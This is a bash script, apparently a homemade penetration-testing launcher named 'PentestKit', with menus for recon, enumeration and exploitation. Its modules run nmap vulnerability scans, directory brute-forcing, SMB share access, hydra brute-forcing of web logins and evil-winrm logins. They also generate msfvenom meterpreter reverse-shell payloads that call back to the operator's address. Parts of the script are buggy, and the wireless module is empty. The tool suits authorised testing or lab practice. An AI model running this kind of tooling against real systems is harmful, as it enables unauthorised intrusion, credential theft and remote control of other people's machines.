#!/bin/bash

GREEN='\033[0;32m'
PURPLE='\033[0;35m'
until [[ $CHOICE == "q" ]]
do
clear
echo -e " ${PURPLE} ---------------------------------------------------- "
echo 		" |     ____             __            __  __ __ _ __  |" 
echo 		" |    / __ \___  ____  / /____  _____/ /_/ //_/(_) /_ |"
echo 		" |   / /_/ / _ \/ __ \/ __/ _ \/ ___/ __/ ,<  / / __/ |"
echo 		" |  / ____/  __/ / / / /_/  __(__  ) /_/ /| |/ / /_   |"
echo 		" | /_/    \___/_/ /_/\__/\___/____/\__/_/ |_/_/\__/   |"
echo 		"  ---------------------------------------------------- "
echo 		""

echo -e		" _____________________________________________________|_._._._._._._._._._."
echo 		" \____________________________________________________|_#_#_#_#_#_#_#_#_#_|"
echo    	"                                              	      |	                    "
echo -e 	" ${GREEN}"
echo 		"  ********************[Main Menu]**********************"
echo		""
echo 		"  ---------------------------------------------------- "
echo 		" |             |                                      |"
echo 		" |      1      |         Recon Module                 |"
echo 		" |             |                                      |"
echo 		"  ---------------------------------------------------- "
echo 		"  ---------------------------------------------------- "
echo 		" |             |                                      |"
echo 		" |      2      |         Enumeration Module           |"
echo 		" |             |                                      |"
echo 		"  ---------------------------------------------------- "
echo 		"  ---------------------------------------------------- "
echo 		" |             |                                      |"
echo		" |      3      |         Exploit Module               |"
echo 		" |             |                                      |"
echo 		"  ---------------------------------------------------- "
echo 		"  ---------------------------------------------------- "
echo 		" |             |                                      |"
echo		" |      4      |         Wireless Module              |"
echo 		" |             |                                      |"
echo 		"  ---------------------------------------------------- "
echo		""
echo 		"  **************************************************** "
read -p 	"  < Please Choose Which Module To Use > " CHOICE

# RECON Module

if [ $CHOICE == 1 ]
then
	until [[ $RCHOICE == "q" ]] 
	do
	clear
	echo -e " ${PURPLE} ---------------------------------------------------- "
	echo 		" |     ____                                           |"
	echo 	 	" |    / __ \___  _________  ____                      | "
	echo 	 	" |   / /_/ / _ \/ ___/ __ \/ __ \       ___o |======) |"   
	echo 	 	" |  / _, _/  __/ /__/ /_/ / / / /      /\  \/   /\    |"
	echo 	 	" | /_/ |_|\___/\___/\____/_/ /_/      / /      /  \   |"
	echo 	 	" |                                                    |"
	echo 	 	"  ---------------------------------------------------- "
	echo		""
	echo -e " ${GREEN} ---------------------------------------------------- "
	echo 		" |             |                                      |"
	echo 		" |      1      |            Enter Target              |"
	echo 		" |             |                                      |"
	echo 		"  ---------------------------------------------------- "
	echo 		"  ---------------------------------------------------- "
	echo 		" |             |                                      |"
	echo 		" |      2      |            Basic Scan                |"
	echo 		" |             |                                      |"
	echo 		"  ---------------------------------------------------- "
	echo 		"  ---------------------------------------------------- "
	echo 		" |             |                                      |"
	echo 		" |      3      |            Advanced Scan             |"
	echo 		" |             |                                      |"
	echo 		"  ---------------------------------------------------- "
	echo		""
	echo		"  *************************" 
	echo		"  <  TARGET = $TARGET  >"
	echo		"  *************************"
	read -p 	"  < Please Enter Your Choice > " RCHOICE
	
	if [ $RCHOICE == 1 ]
	then
		clear
		echo	""
                echo -e "${PURPLE}  			          ___     "
                echo		"	    		        /\ _ /\   "
		echo		"	    >>>----            / /\ /\ \  "
		echo		"	  >>>----             |---(*)---| "
                echo		"	 		       \ \/_\/ /  "
	        echo		"	 	   >>>----      \/___\/   "
		echo		""
		echo -e	 " ${GREEN}********************************************* "
		read -p 	" < Enter The Target IP Address > " TARGET
		echo $TARGET
	fi

	if [ $RCHOICE == 2 ]
	then
		until [[ $QCHOICE == "q" ]]
		do
			if ping -c1 $TARGET | grep "64" > /dev/null 
			then
				echo " ******************************************************* "
				read -p " < Would You Like To Write The Outputs Files? [y/n] > " W2F
				if [ $W2F == "y" ]
				then
					clear
					echo -e " ${PURPLE}**************************************"
					echo		" *    	    Scanning Target...         *"
					echo		" *	    Please Be Patient	       *"
					echo		" **************************************"
					nmap -sS -sV -A -vvv $TARGET -oN ~/Recon/nmapscan.txt
					echo -e " ${GREEN}**************************************"
					echo		" *          Scan Complete :)          *"
					echo		" **************************************"
					echo	""					
					echo	" ****************************************************** "
					read -p " < Enter [q] To Go Back Or Any Key To Restart Scan > " QCHOICE
				fi
				if [ $W2F == "n" ]
				then
					clear
					echo -e " ${PURPLE}**************************************"
					echo		" *    	    Scanning Target...         *"
					echo		" *	    Please Be Patient	       *"
					echo		" **************************************"
					nmap -sS -sV -A -vvv $TARGET
					echo -e " ${GREEN}**************************************"
					echo		" *          Scan Complete :)          *"
					echo		" **************************************"
					echo	""					
					echo	" ****************************************************** "
					read -p " < Enter [q] To Go Back Or Any Key To Restart Scan > " QCHOICE
					else
						echo " < Invalid Input Try Again > "
					fi
				fi
		done
	fi

	if [ $RCHOICE == 3 ]
	then
		until [[ $QCHOICE == "q" ]]
		do
			if ping -c1 $TARGET | grep "64" > /dev/null
			then
				echo " ******************************************************* "
				read -p " < Would You Like To Write The Outputs Files? [y/n] > " W2F			
				if [ $W2F == "y" ]
				then
					clear	
					echo -e " ${PURPLE}**************************************"
					echo		" *    	    Scanning Target...         *"
					echo		" *	    Please Be Patient	       *"
					echo		" **************************************"		
					nmap -sS -sV -A -vvv $TARGET -oN ~/Recon/nmapscan.txt
					echo -e " ${GREEN}**************************************"
					echo		" *          Scan Complete :)          *"
					echo		" **************************************"	
					if cat ~/Recon/nmapscan.txt | grep Windows
					then
						echo -e " ${PURPLE}**************************************"
						echo		" * Scanning The Windows Environment...*"
						echo		" *	   Please Be Patient	       *"
						echo		" **************************************"
						echo		" *     Collecting Information...      *"
						echo		" **************************************"			
						enum4linux $TARGET > ~/Recon/enum4linux.txt
						echo -e " ${GREEN}**************************************"
						echo		" *          Scan Complete :)          *"
						echo		" **************************************"
					fi
					if cat ~/Recon/nmapscan.txt | grep 80/tcp
					then
						echo	""
						echo -e " ${PURPLE}****************************************"
						echo		" * Performing A Web Directory Bruteforce *"
						echo		" *	     Please Be Patient	          *"
						echo		" *****************************************"
						echo	""
						dirb http://$TARGET -o ~/Recon/dirbscan.txt
						echo -e " ${GREEN}*****************************************"
						echo		" *    Directory Bruteforce Complete :)   *"
						echo		" *****************************************"
						echo	""
						echo -e " ${PURPLE}****************************************"
						echo	" * Running Website Vulnerability Scan... *"
						echo	" *	     Please Be Patient	          *"
						echo	" *****************************************"
						echo	""
						nikto -h $TARGET -o webvulnscan.txt
						echo -e " ${GREEN}**************************************"
						echo	" *          Scan Complete :)          *"
						echo	" **************************************"			
					fi
					if cat ~/Recon/nmapscan.txt | grep 21/tcp
					then
						nmap --script=ftp-anon -vvv $TARGET -oN ~/Recon/ftpanon.txt
						echo -e " ${PURPLE}**************************************"
						echo		" *    Scanning For Possible CVEs...   *"
						echo		" *	   Please Be Patient	       *"
						echo		" **************************************"
						nmap --script=vuln -vvv $TARGET
						echo -e " ${GREEN}**************************************"
						echo		" *          Scan Complete :)          *"
						echo		" **************************************"
					fi
					echo	""					
					echo	" ****************************************************** "
					read -p " < Enter [q] To Go Back Or Any Key To Restart Scan > " QCHOICE
				fi					
					if [ $W2F == "n" ]
					then	
						clear	
						echo -e " ${PURPLE}**************************************"
						echo		" *    	    Scanning Target...         *"
						echo		" *	    Please Be Patient	       *"
						echo		" **************************************"
						nmap -sS -sV -A -vvv $TARGET -oN scan.txt
						echo -e " ${GREEN}**************************************"
						echo		" *          Scan Complete :)          *"
						echo		" **************************************"
						if cat scan.txt | grep Windows
						then
							echo -e " ${PURPLE}**************************************"
							echo	" * Scanning The Windows Environment...*"
							echo	" *	   Please Be Patient	       *"
							echo	" **************************************"
							echo	" *     Collecting Information...      *"
							echo	" **************************************"
							enum4linux $TARGET 
							echo -e " ${GREEN}**************************************"
							echo	" *          Scan Complete :)          *"
							echo	" **************************************"
						fi
						if cat scan.txt | grep 80/tcp
						then
							echo -e " ${PURPLE}****************************************"
							echo	" * Performing A Web Directory Bruteforce *"
							echo	" *	     Please Be Patient	          *"
							echo	" *****************************************"
							dirb http://$TARGET 	
							echo -e " ${GREEN}*****************************************"
							echo	" *    Directory Bruteforce Complete :)   *"
							echo	" *****************************************"
							echo	""
							echo -e " ${PURPLE}****************************************"
							echo	" * Running Website Vulnerability Scan... *"
							echo	" *	     Please Be Patient	          *"
							echo	" *****************************************"
							echo	""
							nikto -h $TARGET
							echo -e " ${GREEN}**************************************"
							echo	" *          Scan Complete :)          *"
							echo	" **************************************"
						fi
						if cat scan.txt | grep 21/tcp
						then
							nmap --script=ftp-anon -vvv $TARGET
						fi
							echo -e " ${PURPLE}********************************************"
							echo	" *    Scanning For Anonymous FTP Login...   *"								
							echo	" *	        Please Be Patient            *"
							echo	" ********************************************"
							nmap --script=vuln -vvv $TARGET
							echo -e " ${GREEN}********************************************"
							echo	" *              Scan Complete :)            *"
							echo	" ********************************************"
							echo	""	
							rm 	scan.txt				
							echo	" ****************************************************** "
							read -p " < Enter [q] To Go Back Or Any Key To Restart Scan > " QCHOICE
						else
							echo " < Invalid Input Try Again > "
						fi
			fi
		done	
	fi
	done
fi

#ENUMERATION Module

if [ $CHOICE == 2 ]
then

	until [[ $ECHOICE == "q" ]] 
	do
	clear
	echo -e " ${PURPLE} --------------------------------------------------------------------------------------------- "
		echo -e " |     ______                                      __  _                                       | "
	   	echo -e " |    / ____/___  __  ______ ___  ___  _________ _/ /_(_)___  ____               |   _   _     | "
	  	echo -e " |   / __/ / __ \/ / / / __  __ \/ _ \/ ___/ __ \/ __/ / __ \/ __ \        . | . x .|.|-|.|    | "
	 	echo -e " |  / /___/ / / / /_/ / / / / / /  __/ /  / /_/ / /_/ / /_/ / / / /     |\ ./.\-/.\-|.|.|.|    | "
		echo -e " | /_____/_/ /_/\__,_/_/ /_/ /_/\___/_/   \__,_/\__/_/\____/_/ /_/   ~~~|.|_|.|_|.|.|.|_|.|~~~ | "
		echo -e " |                                                                                             |"
	        echo	"  --------------------------------------------------------------------------------------------- "                                                        	
		echo	""
		echo -e " ${GREEN} --------------------------------------------------------------------------------------------- "
		echo 	" |             |                                                                               |"
		echo 	" |      1      |                                Enter Target                                   |"
		echo 	" |             |                                                                               |"
		echo 	"  --------------------------------------------------------------------------------------------- "
		echo 	"  --------------------------------------------------------------------------------------------- "
		echo 	" |             |                                                                               |"
		echo 	" |      2      |                                 SMB Login                                     |"
		echo 	" |             |                                                                               |"
		echo 	"  --------------------------------------------------------------------------------------------- "
		echo 	"  --------------------------------------------------------------------------------------------- "
		echo 	" |             |                                                                               |"
		echo 	" |      3      |                                 FTP Login                                     |"
		echo 	" |             |                                                                               |"
		echo 	"  --------------------------------------------------------------------------------------------- "
		echo 	"  --------------------------------------------------------------------------------------------- "
		echo 	" |             |                                                                               |"
		echo 	" |      4      |                             Enumeration Scripts                               |"
		echo 	" |             |                                                                               |"
		echo 	"  --------------------------------------------------------------------------------------------- "
		echo	""
		echo	"  *****************************" 
		echo	"  <  TARGET = $TARGET  >"
		echo	"  *****************************"
		read -p "  < Please Enter Your Choice > " ECHOICE
	
	if [ $ECHOICE == 1 ]
	then
		clear
		echo	""
                echo -e "${PURPLE}  			          ___     "
                echo		"	    		        /\ _ /\   "
		echo		"	    >>>----            / /\ /\ \  "
		echo		"	  >>>----             |---(*)---| "
                echo		"	 		       \ \/_\/ /  "
	        echo		"	 	   >>>----      \/___\/   "
		echo		""
		echo -e	 " ${GREEN}********************************************* "
		read -p 	" < Enter The Target IP Address > " TARGET
		echo $TARGET
	fi
	if [ $ECHOICE == 2 ]
	then	
		read -p " < Do You Have User Credentials? [y/n] > " CREDCHOICE
		if [ $CREDCHOICE == "y" ]
		then
			echo	" ************************************"
			read -p " < Please Enter The Username > " USER
			echo	" ************************************"
			echo	""
			echo	" ************************************"
			read -p " < Please Enter The Password > " PASS
			echo	" ************************************"
			clear
			echo -e " ${PURPLE}***************************************"
			echo		" *       Connecting to Target...       *"
			echo		" ***************************************"
			smbclient -L $TARGET -U '$USER%$PASS'
			echo	""
			echo -e " ${GREEN}************************************************ "
			read -p " < Please Enter The Share To Connect To > " SHARE
			echo	" ************************************************ "
			echo	""
			echo	" ************************************************"
			echo	" *        Enter 'exit' To Return To Menu        *"
			echo	" ************************************************"
			smbclient //$TARGET/$SHARE -U '$USER%$PASS' 
		fi
		if [ $CREDCHOICE == "n" ]
		then
			clear
			echo -e " ${PURPLE}***************************************"
			echo	" *       Connecting to Target...       *"
			echo	" ***************************************"
			echo	""
			smbclient -L $TARGET 
			echo	""
			echo -e " ${GREEN}************************************************ "
			read -p " < Please Enter The Share To Connect To > " SHARE
			echo	" ************************************************ "
			echo	""
			echo	" ************************************************"
			echo	" *        Enter 'exit' To Return To Menu        *"
			echo	" ************************************************"
			smbclient //$TARGET/$SHARE  
		fi		
	fi
	if [ $ECHOICE == 3 ]
	then
		clear
		echo -e " ${PURPLE}***************************************"
		echo	" *       Connecting to Target...       *"
		echo	" ***************************************"
		echo	""
		echo -e " ${GREEN}************************************************ "
		echo	" *        Enter 'exit' To Return To Menu        *"
		echo	" ************************************************" 
		ftp $target
	fi
	if [ $ECHOICE == 4 ]
	then
		ESCRIPT=`ls -l ~/Enumeration/Scripts/`
		IP=`ip -4 addr show eth0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}'`
		read -p " < Please Enter How Many Seconds You Would Like The Web Server Up For > " TOUT
		clear
		echo -e " ${GREEN}***********************************************************************"
		echo 	" *< Web Server Spawned On http://$IP/ To Download Enum Scripts From. > *"
		echo 	" *              < Here Is A List Of Scripts Available >                *"
		echo 	" ***********************************************************************"
		echo	""
		echo 	"                             $ESCRIPT                                   "
		echo	""
		echo	" ***********************************************************************"		
		timeout $TOUT python -m SimpleHTTPServer 80
	fi
	done
fi

#EXPLOIT Module

if [ $CHOICE == 3 ]
then

	until [[ $XCHOICE == "q" ]] 
	do
	clear
	echo -e " ${PURPLE} ----------------------------------------------------- "
	echo		" |                                        ,  /\  .     |"
	echo    	" |       ______           __      _ __    / -||- \\     |"
	echo 	 	" |      / ____/  ______  / /___  (_) /_ (| -=||=- |)   |"
	echo -e	 	" |     / __/ | |/_/ __ \/ / __ \/ / __/   \\ -||- /     |"   
	echo    	" |    / /____>  </ /_/ / / /_/ / / /_        ||        |"
	echo    	" |   /_____/_/|_/ .___/_/\____/_/\__/        ||        |"
	echo    	" |             /_/                           ||        |"
	echo		" |                                           ()        |"
	echo 	 	"  ----------------------------------------------------- "
	echo		""
	echo -e " ${GREEN} ----------------------------------------------------- "
	echo 		" |             |                                       |"
	echo 		" |      1      |            Enter Target               |"
	echo 		" |             |                                       |"
	echo 		"  ----------------------------------------------------- "
	echo 		"  ----------------------------------------------------- "
	echo 		" |             |                                       |"
	echo 		" |      2      |          Payload Generator            |"
	echo 		" |             |                                       |"
	echo 		"  ----------------------------------------------------- "
	echo 		"  ----------------------------------------------------- "
	echo 		" |             |                                       |"
	echo 		" |      3      |              CVE Search               |"
	echo 		" |             |                                       |"
	echo 		"  ----------------------------------------------------- "
	echo 		"  ----------------------------------------------------- "
	echo 		" |             |                                       |"
	echo 		" |      4      |         Web Login Bruteforce          |"
	echo 		" |             |                                       |"
	echo 		"  ----------------------------------------------------- "
	echo 		"  ----------------------------------------------------- "
	echo 		" |             |                                       |"
	echo 		" |      5      |          Evil WinRm Login             |"
	echo 		" |             |                                       |"
	echo 		"  ----------------------------------------------------- "
	echo 		"  ----------------------------------------------------- "
	echo 		" |             |                                       |"
	echo 		" |      6      |             msfconsole                |"
	echo 		" |             |                                       |"
	echo 		"  ----------------------------------------------------- "
	echo		""
	echo		"  *************************" 
	echo		"  <  TARGET = $TARGET  >"
	echo		"  *************************"
	read -p 	"  < Please Enter Your Choice > " XCHOICE

	if [ $XCHOICE == 1 ]
	then
		clear
		echo	""
                echo -e "${PURPLE}  			          ___     "
                echo		"	    		        /\ _ /\   "
		echo		"	    >>>----            / /\ /\ \  "
		echo		"	  >>>----             |---(*)---| "
                echo		"	 		       \ \/_\/ /  "
	        echo		"	 	   >>>----      \/___\/   "
		echo		""
		echo -e	 " ${GREEN}********************************************* "
		read -p 	" < Enter The Target IP Address > " TARGET
	fi

	if [ $XCHOICE == 2 ]
	then	
		clear
		echo	" ******************"
		echo	" * < 1. Windows > *"
		echo	" *  < 2. Linux >  *"
		echo	" ******************"
		read -p " < Please Enter Target OS [1/2] > " OS
		if [ $OS == 1 ]
		then
			ifconfig
			echo	""
			echo	" **********************************************"
			read -p " < Please Enter Which Network Adapter To Use > " NETAD
			IP=`ip -4 addr show $NETAD | grep -oP '(?<=inet\s)\d+(\.\d+){3}'`
			echo	" **********************************************************"
			read -p " < Please Enter The Port Number To Communicate On > " PNUM
			echo	" **********************************************************"
			read -p " < Please Enter The Format Of The Payload e.g. elf,exe > " FORM
			echo	" **********************************************************************************"
			read -p " < Please Enter The Filename With Path For The Payload To Be Written To > " FNAME
			echo	" **********************************************************************************"
			msfvenom -p windows/meterpreter/reverse_tcp --platform Windows LHOST=$IP LPORT=$PNUM -f $FORM > $FNAME
			read -p " < Press Any Key To Exit > " EXIT	
		fi
		if [ $OS == 2 ]
		then
			echo	""
			ifconfig
			echo	""
			echo	" **********************************************"
			read -p " < Please Enter Which Network Adapter To Use > " NETAD
			IP=`ip -4 addr show $NETAD | grep -oP '(?<=inet\s)\d+(\.\d+){3}'`
			echo	" **********************************************************"
			read -p " < Please Enter The Port Number To Communicate On > " PNUM
			echo	" **********************************************************"
			read -p " < Please Enter The Format Of The Payload e.g. raw,bash > " FORM
			echo	" **********************************************************************************"
			read -p " < Please Enter The Filename With Path For The Payload To Be Written To > " FNAME
			echo	" **********************************************************************************"
			msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$IP LPORT=$PNUM -f $FORM > $FNAME
			read -p " < Press Any Key To Exit > " EXIT	
		fi
	fi
	
	if [ $XCHOICE == 3 ]
	then
		echo	" **********************************************"
		read -p " < Please Enter The Target Software > " SOFT
		echo	" **********************************************"
		searchsploit $SOFT
		read -p " < Press Enter To Exit > " EXIT
	fi

	if [ $XCHOICE == 4 ]
	then	
		clear
		echo	" ************************************************"
		read -p " < Please Enter The Target Web Page > " WEBTARG
		echo	" ************************************************"
		read -p " < Please Enter The Username > " USER
		echo	" ************************************************"
		read -p " < Please Enter The Password List > " PASSLIST
		echo	" ************************************************"
		echo    " < EXAMPLE (http-post-form “/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login Failed”) > "
		read -p " < Please Enter The Request Body >" RBOD
		echo	" ************************************************"
		echo	""
		hydra -P $PASSLIST $WEBTARG $RBOD
		echo	""
		read -p " < Press Enter To Exit > " EXIT	
	fi
	
	if [ $XCHOICE == 5 ]
	then
		clear
		echo	" ***********************************************"
		read -p " < Please Enter Target IP Address > " TARGRM
		echo	" ***********************************************"
		read -p " < Please Enter The Username > " USERRM
		echo	" ***********************************************"
		read -p " < Please Enter The Password > " PASSRM
		echo	" ***********************************************"
		echo	""
		ruby /root/Apps/evil-winrm/evil-winrm.rb -i $TARGRM -u $USERRM -p $PASSRM
		echo 	""
		read -p " < Press Enter To Exit > " EXIT
	fi

	if [ $XCHOICE == 6 ]
	then
		clear
		echo	" *******************************************"
		echo	" *    Type 'exit' To Leave The Console     *"
		echo	" *******************************************"
		echo	""
		msfdb run
	fi	
	done
fi	
	

#WIRELESS Module

if [ $CHOICE == 4 ]
then

	echo

fi
done


